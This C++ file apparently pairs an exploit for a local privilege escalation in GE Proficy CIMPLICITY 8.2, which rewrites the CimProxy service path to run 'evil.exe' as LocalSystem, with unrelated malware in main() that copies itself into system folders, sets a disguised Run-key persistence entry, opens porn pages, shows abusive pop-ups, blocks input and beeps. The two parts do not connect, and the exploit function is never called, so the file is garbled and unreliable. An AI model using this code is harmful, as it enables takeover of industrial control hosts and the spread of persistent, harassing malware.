#include <windows.h>
#include <fstream>
#include <winuser.h>
 
using namespace std;

/*
# Exploit Title: GE Proficy HMI/SCADA CIMPLICITY 8.2 Local Privilege Escalation Exploit(0 day)
# Vulnerability Discovery and Exploit Author: Zhou Yu
# Email: <504137480@qq.com>
# Version: 8.2
# Tested on: Windows 7 SP1 X32
# CVE : None

Vulnerability Description:
SERVICE_CHANGE_CONFIG Privilege Escalation
C:\Users\lenovo\Desktop\AccessChk>accesschk.exe -q -v -c CimProxy
CimProxy
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        SERVICE_ALL_ACCESS

C:\Users\lenovo\Desktop\AccessChk>sc qc CimProxy
[SC] QueryServiceConfig �ɹ�

SERVICE_NAME: CimProxy
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Proficy\Proficy CIMPLICITY\exe\Cim
Proxy.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : CIMPLICITY Proxy Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
Usage:
Put evil.exe and the exploit in the same folder and then run the exploit.
*/
#include <stdio.h>
#include <string.h>
void poc()
{
	char szPath[MAX_PATH];
	char *t;
    GetModuleFileName(NULL,szPath,MAX_PATH);
	t = strrchr(szPath, 0x5C);
	t[0] = '\\';
	t[1] = '\0';
	strcat(szPath,"evil.exe\"");
	char t1[] = "\"cmd.exe /c ";
	char payload[] = "sc config CimProxy binPath= ";
	strcat(t1,szPath);
	strcat(payload,t1);

	system(payload);
	//stop service
	printf("stop service!\n");
	system("net stop CimProxy");
	//start service
	printf("start service!\n");
	system("net start CimProxy");

}



int main()
{       
    char system[MAX_PATH];
    char windows[MAX_PATH];
    char pathtofile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
    GetSystemDirectory(system,sizeof(system));
    GetWindowsDirectory(windows,sizeof(windows));
    strcat(system,"\\najort5g.exe");
    strcat(windows,"\\najort5g.exe");
    CopyFile(pathtofile,system,false);
    CopyFile(pathtofile,windows,false);
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
    RegSetValueEx(hKey, "Windows Live Messenger",0,REG_SZ,(const unsigned char*)system,sizeof(system));
    RegCloseKey(hKey);  
     
    void messageset();
    void pornpopup();
    void payload();
     
    int y = 1;
    while(y<10)
    {
      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)messageset, NULL, 0, NULL);
      Sleep(60000);
      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pornpopup, NULL, 0, NULL);
      Sleep(60000);
      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
      Sleep(60000);
    }
}
 
    void messageset()
    {
       if(MessageBox(
       NULL,
       "Neanderthal is watching you",
       "Neanderthal",
       MB_OKCANCEL)==IDCANCEL)
       {
       MessageBox(
       NULL,
       "You can't cancel me mother fucker!",
       "Neanderthal",
       MB_OK);
       }
    }
 
     void pornpopup()
    {  
       char Website[MAX_PATH] = "www.porn.com";
       ShellExecute(NULL,"open",Website,NULL,NULL,SW_MAXIMIZE);
     
       MessageBox(
       NULL,
       "Naughty, Naughty, looking at porn are we now?... Dispicable",
       "Neanderthal",
       MB_OK);
    }
     
        
     
     void payload()
     {
       int a = 1;
     
       while(a<100)
       {
          BlockInput(TRUE);
          SetCursorPos(500,500);
          Sleep(3000);
          a++;
       }
     
       Sleep(10000);
       int freq = 100;
       int loop = 1;
       while(loop<200)
       {       
           Beep(freq,100);
           Sleep(50);
           freq++;
           loop++;
       }
    }